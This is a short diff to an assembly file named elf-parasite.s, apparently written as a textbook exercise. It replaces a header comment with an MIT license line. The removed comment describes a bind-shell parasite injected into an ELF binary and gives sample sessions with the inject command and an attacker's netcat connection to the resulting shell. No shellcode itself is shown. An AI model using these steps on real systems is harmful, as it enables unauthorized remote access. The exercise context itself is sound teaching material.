@@ -2,39 +2,7 @@
 ; elf-parasite.s
 ;
 ; Written by Manuel Gebele (m.gebele‹ατ›tuta.io)
-;
-; Chapter 7, Exercise 3
-;
-; An implementation of a bind shell which opens up a communication port (listener)
-; on the victim machine and waits for an incoming connection.
-;
-; Preconditions/Dependencies:
-; - a compiled version of victim.c
-;
-; Sample session (victim machine):
-; $ nasm -f bin -o elf-parasite.bin elf-parasite.s
-; $ ./elfinject victim elf-parasite.bin ".parasite" 0x800000 0
-; $ ./victim
-; $ netstat -ap tcp | grep victim
-; tcp        0      0 *:19484   *:*    LISTEN      8545/victim
-; $
-;
-; Sample session (attacker machine):
-; $ nc -nv 10.0.0.33 19484
-; found 0 associations
-; found 1 connections:
-;     1:	flags=82<CONNECTED,PREFERRED>
-;	        outif en0
-;	        src 10.0.0.37 port 61034
-;	        dst 10.0.0.33 port 19484
-;	        rank info not available
-;	        TCP aux info available
-;
-; Connection to 10.0.0.33 port 19484 [tcp/*] succeeded!
-; whoami
-; admin
-; exit
-; $
+; This code is licensed under the MIT License (MIT).
 ;---------------------------------+-----------------------------------------------+
 ; CODE LISTING                    | CODE COMMENT
 ;---------------------------------+-----------------------------------------------+
